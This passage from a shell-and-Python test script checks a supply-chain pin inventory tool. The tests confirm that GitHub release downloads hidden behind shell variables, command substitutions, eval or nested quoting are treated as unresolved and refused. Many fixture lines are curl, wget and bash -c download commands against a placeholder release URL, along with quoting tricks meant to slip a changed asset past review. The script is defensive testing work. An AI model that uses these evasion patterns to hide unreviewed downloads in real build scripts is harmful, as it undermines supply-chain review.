base = wf(dl("${A}.tgz")); head = dict(base); head[".github/workflows/other.yml"] = wf(dl("${A}.tgz"))[".github/workflows/ci.yml"]
assert len(inv.moved(inv.inventory(base), inv.inventory(head))) == 1
e1, e2 = "${{ contains('a  b', 'a b') }}.tgz", "${{ contains('a b', 'a b') }}.tgz"
assert len(inv.moved(inv.inventory(wf(dl(e1))), inv.inventory(wf(dl(e2))))) == 1
sc = lambda v: {"bin/install-scanner.sh": "A=" + v + "\n" + dl("${A}") + "\n"}
assert len(inv.moved(inv.inventory(sc("x.tgz")), inv.inventory(sc("y.tgz")))) == 1
co = lambda v: {".github/actions/x/action.yml": "name: x\ninputs:\n  asset:\n    default: " + v + "\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: " + dl("${{ inputs.asset }}") + "\n"}
assert len(inv.moved(inv.inventory(co("x.tgz")), inv.inventory(co("y.tgz")))) == 1
PY

CASE="an item whose asset path is a placeholder is no pin: judge_item refuses it (REQ-SUP-001-AC2, AC3)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
it = next(iter(inv.inventory({"bin/x.sh": "curl -fsSL https://github.com/o/r/releases/download/v1.2.3/${A}.tgz -o x\n"}).values()))
ok = age.judge_item(it)[0]
assert ok is False
PY

CASE="release downloads behind variables, round 2 findings: a later assignment, an indirect assignment (A=\$B) and the whitespace of a continued value are part of a script download's identity; a local composite call's with: value is part of the call's identity; an unrelated placeholder item keeps the key it had (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
dl = 'curl -fsSL "https://github.com/o/r/releases/download/v1.2.3/${A}" -o x\n'
variants = [("A=x.tgz\n" + dl + "A=z.tgz\n", "A=y.tgz\n" + dl + "A=z.tgz\n"),
            ("B=x.tgz\nA=$B\n" + dl, "B=y.tgz\nA=$B\n" + dl),
            ('A=$(printf "%s" "x\\\n  .tgz" | tr " " "_")\n' + dl, 'A=$(printf "%s" "x\\\n   .tgz" | tr " " "_")\n' + dl)]
for script in ("bin/install-scanner.sh", "bin/x.sh"):
    for before, after in variants:
        assert inv.moved(inv.inventory({script: before}), inv.inventory({script: after})), (script, before)
action = "name: x\ninputs:\n  asset:\n    default: x.tgz\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: curl https://github.com/o/r/releases/download/v1.2.3/${{ inputs.asset }}\n"
tree = lambda a: {".github/actions/x/action.yml": action, ".github/workflows/ci.yml": "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ./.github/actions/x\n        with:\n          asset: " + a + "\n"}
assert inv.moved(inv.inventory(tree("x.tgz")), inv.inventory(tree("y.tgz")))
q = lambda v: {".github/workflows/ci.yml": "on: push\nenv:\n  A: old\n  B: new\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://github.com/o/r/releases/download/v1.2.3/tool-\"${" + v + "}\".tgz\n"}
assert inv.moved(inv.inventory(q("A")), inv.inventory(q("B"))), "a variable after a quote is part of the asset name"
assert set(inv.inventory({"bin/x.sh": "pip install black\n"})) == {"package:pypi/black@(unpinned)#step:c38ddd42b810871e60f5080663fe9d5d899dd5a38d61c1563b41a1b78a56eed5"}
wfk = {".github/workflows/ci.yml": "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: pip install black\n"}
assert set(inv.inventory(wfk)) == {"package:pypi/black@(unpinned)#step:875cc02f02e6bc952fc1bca71c436657c10fc7e27058713fbd137cf0aed5eed8"}
PY

CASE="release downloads behind variables, round 3 findings: assignment ORDER, a name holding \$( ) with a space, composite input context kept apart from other items' keys, and a query variable that is not part of the name (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
url = "https://github.com/o/r/releases/download/v1.2.3/"
dl = 'curl "' + url + '${A}.tgz" -o x\n'
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    assert inv.moved(inv.inventory({path: "B=x\nA=$B\nB=y\n" + dl}), inv.inventory({path: "B=y\nA=$B\nB=x\n" + dl})), path
wf = lambda asset: {".github/workflows/ci.yml": "on: push\nenv:\n  A: x\n  B: y\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl \"" + url + asset + "\" -o x\n"}
a, b = wf('$(printf %s "$A").tgz'), wf('$(printf %s "$B").tgz')
assert set(inv.inventory(a)) != set(inv.inventory(b))
it = next(iter(inv.inventory(b).values()))
assert "${" in it.path and "printf %s" in it.path, it.path
assert not age.judge_item(it)[0]
comp = {".github/actions/x/action.yml": "name: x\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: pip install black\n"}
assert set(inv.inventory(comp)) == {"package:pypi/black@(unpinned)#step:c38ddd42b810871e60f5080663fe9d5d899dd5a38d61c1563b41a1b78a56eed5"}
assert all(it.step for it in inv.inventory(wf("x.tgz?download=${A}")).values())   # a quoted string holding a variable is unresolved (whole-file identity): fail-closed, advisor 0442
PY

CASE="release downloads behind variables, round 3 (seat B): reordered assignments, the spacing of a continued value inside the download line itself, and the literals of an expression in a latest/download URL are each part of the identity (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
coll = lambda path, b, a: bool(inv.moved(inv.inventory({path: b}), inv.inventory({path: a})))
dl = "curl https://github.com/o/r/releases/download/v1.2.3/${A}.tgz\n"
for p in ("bin/x.sh", "bin/install-scanner.sh"):
    assert coll(p, "A=x\nA=y\n" + dl + "A=z\n", "A=y\nA=x\n" + dl + "A=z\n"), p
    cont = lambda n: 'curl "https://github.com/o/r/releases/download/v1.2.3/${A:-$(printf "%s" "x\\\n' + " " * n + '.tgz" | tr " " "_")}"\n'
    assert coll(p, cont(2), cont(3)), p
wf = lambda run: "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: " + json.dumps(run) + "\n"
latest = "curl https://github.com/o/r/releases/latest/download/${{ contains('a  b', 'a b') }}.tgz"
assert coll(".github/workflows/ci.yml", wf(latest), wf(latest.replace("'a  b'", "'a b'")))
PY

CASE="release downloads behind variables, round 4 findings: a variable after a quote that closed the URL, a name with a command substitution or backticks or a positional parameter, and assignments in the forms A=x B=old, export A=x B=old and declare -r A= are each part of the identity and refused (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, json, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
url = "https://github.com/o/r/releases/download/v1.2.3/"
wf = lambda run: {".github/workflows/x.yml": "on: push\nenv:\n  A: old\n  B: new\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: " + json.dumps(run) + "\n"}
b1a, b1b = wf('curl "' + url + 'tool-"${A}.tgz'), wf('curl "' + url + 'tool-"${B}.tgz')
assert inv.moved(inv.inventory(b1a), inv.inventory(b1b))
now = dt.datetime(2026, 10, 14, tzinfo=dt.timezone.utc)
for name in ("$(uname -m).tgz", "`uname -m`.tgz", "$1.tgz", "$((1+1)).tgz"):
    it = next(iter(inv.inventory(wf("curl " + url + "tool-" + name)).values()))
    assert it.step, (name, it.key)
    assert not age.judge_item(it)[0], name
dl = "curl " + url + "${B}.tgz\n"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    for pre in ("A=x B=", "export A=x B=", "declare -r B=", "export UNUSED=fixed B="):
        assert inv.moved(inv.inventory({path: pre + "old\n" + dl}), inv.inventory({path: pre + "new\n" + dl})), (path, pre)
PY

CASE="release downloads behind variables, round 5 findings: a quoted exported assignment (export \"A=\$B\") is part of the identity, and a quote inside an earlier command substitution does not change a concrete asset's key (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
dl = "curl https://github.com/o/r/releases/download/v1.2.3/${A}.tgz\n"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    for decl in ('export "A=$%s"', "export 'A=$%s'", 'declare -x "A=$%s"', 'readonly "A=$%s"'):
        b = {path: "B=x.tgz\nC=y.tgz\n" + decl % "B" + "\n" + dl}; a = {path: "B=x.tgz\nC=y.tgz\n" + decl % "C" + "\n" + dl}
        assert inv.moved(inv.inventory(b), inv.inventory(a)), (path, decl)
for pre in ("x=$(printf '%s' ok); ", 'x=$(printf "%s" ok); ', "x=$(echo 'a)b'); ", 'x=$(echo "$(printf \'q\')"); ', "x=`echo 'a'`; "):
    items = []
    inv._step({"run": pre + 'curl https://github.com/o/r/releases/download/v1.2.3/x.tgz -o "$OUT"'}, items, {})
    assert {it.key for it in items} == {"tool:o/r/x.tgz@v1.2.3"}, (pre, [it.key for it in items])
PY

CASE="release downloads behind variables, round 6 findings: a variable read only inside \$(( )), a concrete download inside a command substitution, and the caller's env of a local composite call are part of the identity or leave the concrete key alone (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
url = "https://github.com/o/r/releases/download/v1.2.3/"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    sc = lambda n: {path: "N=" + str(n) + "\ncurl " + url + "tool-$((N)).tgz\n"}
    assert inv.moved(inv.inventory(sc(1)), inv.inventory(sc(2))), path
for run in ('body=$(curl ' + url + 'x.tgz -o "$OUT")', 'a=`curl ' + url + 'x.tgz -o "$OUT"`', 'b="$(curl ' + url + 'x.tgz -o x)"'):
    assert set(inv.inventory({"bin/x.sh": run + "\n"})) == {"tool:o/r/x.tgz@v1.2.3"}, run
action = json.dumps({"name": "x", "runs": {"using": "composite", "steps": [{"shell": "bash", "run": "curl " + url + "${ASSET}.tgz"}]}})
def tree(asset):
    wf = {"on": "push", "jobs": {"j": {"runs-on": "ubuntu-latest", "steps": [{"uses": "./.github/actions/x", "env": {"ASSET": asset}}]}}}
    return {".github/actions/x/action.yml": action, ".github/workflows/x.yml": json.dumps(wf)}
assert inv.moved(inv.inventory(tree("old")), inv.inventory(tree("new")))
PY

CASE="release downloads behind variables, round 7 findings: an array element write and an indirect or indexed expansion are part of the identity, the inherited workflow env and matrix are part of a local action call's identity, a concrete download in double-quoted backticks or in a quoted URL followed by arguments keeps its concrete key (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
url = "https://github.com/o/r/releases/download/v1.2.3/"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    for pre, ref in (("A[0]=%s", "${A}"), ("ASSETS[0]=%s", "${ASSETS[0]}"), ("ASSETS[1]=%s", "${ASSETS[1]}"), ("SEL=%s", "${!P}")):
        extra = "P=SEL\n" if "!P" in ref else ""
        sc = lambda v: {path: extra + pre % v + "\ncurl " + url + ref + ".tgz -o x\n"}
        assert inv.moved(inv.inventory(sc("old")), inv.inventory(sc("new"))), (path, pre, ref)
    idx = lambda i: {path: "ASSETS[0]=a\nASSETS[1]=b\nIDX=" + str(i) + "\ncurl " + url + "${ASSETS[IDX]}.tgz\n"}
    assert inv.moved(inv.inventory(idx(0)), inv.inventory(idx(1))), path
action = json.dumps({"name": "x", "runs": {"using": "composite", "steps": [{"shell": "bash", "run": "curl " + url + "${ASSET}.tgz -o x"}]}})
def tree(**kw):
    wf = {"on": "push", "jobs": {"j": {"runs-on": "ubuntu-latest", "steps": [{"uses": "./.github/actions/x"}]}}}
    if "wenv" in kw: wf["env"] = {"ASSET": kw["wenv"]}
    if "jenv" in kw: wf["jobs"]["j"]["env"] = {"ASSET": kw["jenv"]}
    if "matrix" in kw: wf["jobs"]["j"]["strategy"] = {"matrix": {"asset": [kw["matrix"]]}}
    return {".github/actions/x/action.yml": action, ".github/workflows/x.yml": json.dumps(wf)}
for k in ("wenv", "jenv", "matrix"):
    assert inv.moved(inv.inventory(tree(**{k: "old"})), inv.inventory(tree(**{k: "new"}))), k
for run in ('body="`curl ' + url + 'x.tgz -o x`"', 'curl "' + url + 'x.tgz" -o "$OUT"', "curl '" + url + "x.tgz' -o \"$OUT\""):
    assert set(inv.inventory({"bin/x.sh": run + "\n"})) == {"tool:o/r/x.tgz@v1.2.3"}, (run, sorted(inv.inventory({"bin/x.sh": run + "\n"})))
PY

CASE="release downloads behind variables, round 7 findings (seat A): a name written by printf -v or read, a name written to GITHUB_ENV by an earlier step, a concrete download inside a quoted program string, and a plain local action call under on: push keeps its key (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
url = "https://github.com/o/r/releases/download/v1.2.3/"
mv = lambda a, b: bool(inv.moved(inv.inventory(a), inv.inventory(b)))
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    sc = lambda v: {path: "B=old C=new\nprintf -v A %s \"$" + v + "\"\ncurl " + url + "${A}.tgz\n"}
    assert mv(sc("B"), sc("C")), ("printf -v", path)
    rd = lambda v: {path: "B=old\nC=new\nread -r A <<< \"$" + v + "\"\ncurl " + url + "${A}.tgz\n"}
    assert mv(rd("B"), rd("C")), ("read", path)
def wf(v):
    steps = [{"run": "echo ASSET=$" + v + " >> \"$GITHUB_ENV\""}, {"run": "curl " + url + "${ASSET}.tgz"}]
    return {".github/workflows/x.yml": json.dumps({"on": "push", "env": {"B": "old", "C": "new"}, "jobs": {"j": {"runs-on": "ubuntu-latest", "steps": steps}}})}
assert mv(wf("B"), wf("C")), "GITHUB_ENV"
for run in ("bash -c 'curl " + url + "x.tgz -o \"$OUT\"'", "sh -c 'wget " + url + "x.tgz -O \"$OUT\"'", 'bash -c "curl ' + url + 'x.tgz -o $OUT"'):
    its = list(inv.inventory({"bin/x.sh": run + "\n"}).values())     # a quoted program string that holds a variable is not parsed: its URL is unresolved (refused), never read as a concrete key
    assert len(its) == 1 and "$" in its[0].path, (run, [i.key for i in its])
plain = {".github/actions/x/action.yml": "name: x\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: echo hi\n",
         ".github/workflows/x.yml": "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ./.github/actions/x\n"}
assert all(k.endswith("@(local)") for k in inv.inventory(plain) if k.startswith("action:local")), sorted(inv.inventory(plain))
PY

CASE="release downloads behind variables, round 7 findings (seat B): a quoted parenthesis, an indirection through an assignment and a multiline array cannot hide a changed asset because an unresolved asset is identified by its whole file (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
url = "https://github.com/o/r/releases/download/v1.2.3/"
mv = lambda a, b: bool(inv.moved(inv.inventory(a), inv.inventory(b)))
def wf(v):
    return {".github/workflows/x.yml": "on: push\nenv:\n  A: old\n  B: new\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          body=$(curl \"" + url + "tool)\"${" + v + "}.tgz)\n"}
assert mv(wf("A"), wf("B")), "quoted parenthesis"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    ind = lambda v: {path: "SEL=" + v + "\nP=SEL\nA=${!P}\ncurl " + url + "${A}.tgz\n"}
    assert mv(ind("old"), ind("new")), ("indirect", path)
    arr = lambda v: {path: "A=(\n  " + v + "\n)\ncurl " + url + "${A[0]}.tgz\n"}
    assert mv(arr("old"), arr("new")), ("array", path)
    # an edit anywhere in a file that holds an unresolved download is a moved item; a file with only concrete downloads is unchanged by an unrelated edit
    conc = lambda c: {path: "# " + c + "\ncurl " + url + "x.tgz -o x\n"}
    assert not mv(conc("a"), conc("b")), ("concrete", path)
    assert set(inv.inventory(conc("a"))) == {"tool:o/r/x.tgz@v1.2.3"}
PY

CASE="release downloads behind variables, round 8 findings (same class, nested quoting): a release URL inside a quoted program string that holds a variable, a substitution or a command separator is unresolved (whole-file identity, refused by the age judge), a variable after a quoted parenthesis is part of the name, and a plain quoted download keeps its key (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, json, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
url = "https://github.com/o/r/releases/download/v1.2.3/"
now = dt.datetime(2026, 10, 14, tzinfo=dt.timezone.utc)
def wf(run): return {".github/workflows/p.yml": json.dumps({"on": "push", "jobs": {"j": {"runs-on": "ubuntu-latest", "env": {"A": "old", "B": "new", "OUT": "o"}, "steps": [{"run": run}]}}})}
# nested program strings holding $, a substitution or a separator: unresolved and refused
for run in ("bash -c 'curl \"" + url + "tool;${A}.tgz\"'", "bash -c \"curl " + url + "x.tgz;:>$OUT\"", "bash -c 'curl " + url + "x.tgz -o \"$OUT\"'", "sh -c 'wget " + url + "x.tgz -O \"$OUT\"'", "eval \"curl " + url + "x.tgz $EXTRA\""):
    its = list(inv.inventory(wf(run)).values())
    assert len(its) == 1 and ("$" in its[0].path or "`" in its[0].path), (run, [i.key for i in its])
    assert not age.judge_item(its[0])[0], run
# a variable after a quoted parenthesis changes the name
a = {"bin/x.sh": "curl '" + url + "tool)'${A}.tgz -o x\n"}; b = {"bin/x.sh": "curl '" + url + "tool)'${B}.tgz -o x\n"}
assert inv.moved(inv.inventory(a), inv.inventory(b))
# a plain quoted URL with an argument after it, and a program string with nothing dynamic, keep their keys
for run in ("curl \"" + url + "x.tgz\" -o \"$OUT\"", "bash -c 'curl " + url + "x.tgz -o x'"):
    assert set(inv.inventory({"bin/x.sh": run + "\n"})) == {"tool:o/r/x.tgz@v1.2.3"}, run
PY

CASE="release downloads behind variables, round 9 finding (both seats, same class): a quote segment that merely BEGINS with the release URL inside a quoted program string (eval 'curl \"''https://.../tool;\${A}.tgz''\"') is not an ordinary URL operand: the name is unresolved (whole-file identity, refused by the age judge) and a variable edit is a moved item; a word that is the URL itself keeps its concrete key (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, json, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
url = "https://github.com/o/r/releases/download/v1.2.3/"
def tree(var, run):
    w = {"on": "push", "jobs": {"j": {"runs-on": "ubuntu-latest", "env": {"A": "old", "B": "new"}, "steps": [{"run": run.replace("VAR", var)}]}}}
    return {".github/workflows/p.yml": json.dumps(w)}
for run in ("eval 'curl \"''" + url + "tool;${VAR}.tgz''\"'",
            "sh -c 'curl \"'\"'" + url + "tool-${VAR}.tgz'\"'\"'",
            "bash -c \"curl '\"'\"'" + url + "tool;${VAR}.tgz'\"'\"'\""):
    a, b = inv.inventory(tree("A", run)), inv.inventory(tree("B", run))
    assert inv.moved(a, b), run
    it = next(iter(b.values()))
    assert not age.judge_item(it)[0], run
ok = tree("A", 'curl "' + url + 'x.tgz?download=${A}"')
assert all(it.step for it in inv.inventory(ok).values()), sorted(inv.inventory(ok))   # fail-closed: no refinement for a quoted word that is the URL (advisor 0442)
PY

CASE="today's tree passes the rule and the exact list holds no path that names nothing"
check test $? -eq 0
# --- advisor ruling Oct 16 (cache#347): a listed path ABSENT from the tree is accepted (the reviewed list pre-authorizes only that one exact path); a listed file that
#     EXISTS and does not name the folder is still refused.
python3 - "$work" <<'PY'
import importlib.util, os, sys, tempfile
sys.path.insert(0, ".")
spec = importlib.util.spec_from_file_location("pi", ".github/agent/supply-chain/pin-inventory.py"); m = importlib.util.module_from_spec(spec); sys.modules["pi"] = m; spec.loader.exec_module(m)
with tempfile.TemporaryDirectory(dir=sys.argv[1]) as td:
    os.makedirs(td + "/bin")
    open(td + "/bin/names.sh", "w").write("ls vendor/x\n")
    open(td + "/bin/quiet.sh", "w").write("echo hello\n")
    files = {"bin/names.sh": "ls vendor/x\n", "bin/quiet.sh": "echo hello\n"}
    m._VENDOR_NAMING_FILES = frozenset({"bin/names.sh", "bin/absent.sh"})
    assert m.vendor_list_extras(td, files) == [], "a listed file that names the folder, and a listed path that is absent, are both accepted"
    m._VENDOR_NAMING_FILES = frozenset({"bin/names.sh", "bin/quiet.sh", "bin/absent.sh"})
    assert m.vendor_list_extras(td, files) == ["bin/quiet.sh"], "a listed file that exists and does not name the folder is refused; the absent one is not"
PY
CASE="the exact list: an absent listed path is accepted and a present listed file that names nothing is refused"
check test $? -eq 0

echo "pin-age-check: $pass passed, $failn failed"
test "$failn" -eq 0
